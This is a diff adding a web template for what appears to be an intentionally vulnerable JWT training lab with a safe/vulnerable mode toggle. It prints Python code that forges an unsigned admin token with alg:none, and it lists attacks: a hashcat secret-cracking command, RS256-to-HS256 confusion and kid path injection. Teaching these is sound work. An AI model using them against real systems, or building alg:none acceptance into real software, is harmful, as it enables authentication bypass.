@@ -1,0 +1,87 @@
+{% extends "base.html" %}
+{% block title %}JWT Login{% endblock %}
+{% block content %}
+<h1 class="page-title">JWT — Login & Token Forge</h1>
+<p class="page-subtitle">A07:2021 · Vulnerable JWT accepts alg:none and uses weak crackable secret</p>
+
+<div class="mode-banner {{ 'safe' if safe else 'vuln' }}">
+  <span class="badge">{{ 'SAFE MODE' if safe else 'VULNERABLE' }}</span>
+  {% if safe %}Strong secret + enforced HS256 algorithm + signature always verified.{% else %}Accepts alg:none (no signature). Secret is "weak" — crackable with hashcat.{% endif %}
+  <button onclick="toggleSafe()" class="btn {{ 'btn-red' if safe else 'btn-green' }}" style="margin-left:auto;font-size:11px;padding:0.3rem 0.8rem;">Switch to {{ 'Vulnerable' if safe else 'Safe' }} Mode</button>
+</div>
+
+<div class="split">
+  <div>
+    <div class="card">
+      <div class="card-header"><span>🔑</span><span class="card-title">Get a JWT</span></div>
+      <form method="POST" action="/jwt/login?safe={{ '1' if safe else '0' }}">
+        <div class="form-group">
+          <label class="form-label">Username</label>
+          <input name="username" class="form-input" value="alice">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Password</label>
+          <input name="password" class="form-input" value="password1">
+        </div>
+        <button type="submit" class="btn btn-green" style="width:100%;">Login → Get Token</button>
+      </form>
+      {% if error %}<div class="alert alert-danger">{{ error }}</div>{% endif %}
+      {% if token %}
+      <div style="margin-top:1rem;">
+        <div style="font-size:11px;color:var(--gray);margin-bottom:0.35rem;">Your JWT:</div>
+        <div class="code-block" style="word-break:break-all;font-size:10.5px;">{{ token }}</div>
+        <a href="/jwt/verify?token={{ token }}&safe={{ '1' if safe else '0' }}" class="btn btn-blue" style="margin-top:0.75rem;font-size:12px;">Verify this token →</a>
+      </div>
+      {% endif %}
+    </div>
+
+    <div class="card">
+      <div class="card-header"><span>⚡</span><span class="card-title">None Algorithm Attack</span></div>
+      <div style="font-size:12px;color:var(--gray);margin-bottom:0.75rem;">Forge a JWT with role:admin — no secret needed:</div>
+      <div class="code-block" style="font-size:10.5px;"># Step 1: Build forged header
+import base64, json
+header = base64.urlsafe_b64encode(
+  json.dumps({"alg":"none","typ":"JWT"}).encode()
+).rstrip(b"=").decode()
+
+# Step 2: Build payload with admin role
+payload = base64.urlsafe_b64encode(
+  json.dumps({"user_id":1,"username":"admin",
+              "role":"admin","exp":9999999999}).encode()
+).rstrip(b"=").decode()
+
+# Step 3: Empty signature
+forged = f"{header}.{payload}."
+print(forged)</div>
+      <div style="margin-top:0.75rem;font-size:12px;color:var(--gray);">Paste forged token into <a href="/jwt/verify?safe=0" style="color:var(--blue);">JWT Verify →</a></div>
+    </div>
+  </div>
+
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💡</span><span class="card-title">JWT Structure</span></div>
+      <div class="code-block" style="font-size:11px;">eyJhbGciOiJIUzI1NiJ9     ← Header
+.eyJ1c2VyIjoiYWxpY2UifQ   ← Payload  
+.SflKxw...                 ← Signature
+
+Decoded:
+Header:  {"alg": "HS256", "typ": "JWT"}
+Payload: {"user_id": 2, "role": "user", "exp": ...}
+Sig:     HMAC-SHA256(header.payload, secret)</div>
+
+      {% set attacks = [
+        ("None Algorithm", "Change alg to 'none', drop signature. Some libs skip verification entirely."),
+        ("Weak Secret", "hashcat -a 0 -m 16500 token.txt rockyou.txt — cracks 'weak', 'secret', 'password' in seconds."),
+        ("RS256 → HS256", "Server uses RSA public key for RS256. Switch to HS256, sign with public key as HMAC secret."),
+        ("kid Injection", "{\"kid\": \"../../dev/null\"} — server reads /dev/null as key = empty string = trivial forgery."),
+      ] %}
+      {% for name, desc in attacks %}
+      <div style="margin-bottom:0.75rem;padding:0.6rem;background:#010409;border:1px solid var(--border);border-radius:5px;">
+        <div style="font-size:11px;font-weight:700;color:var(--orange);margin-bottom:0.3rem;">{{ name }}</div>
+        <div style="font-size:11px;color:var(--gray);">{{ desc }}</div>
+      </div>
+      {% endfor %}
+    </div>
+  </div>
+</div>
+{% endblock %}
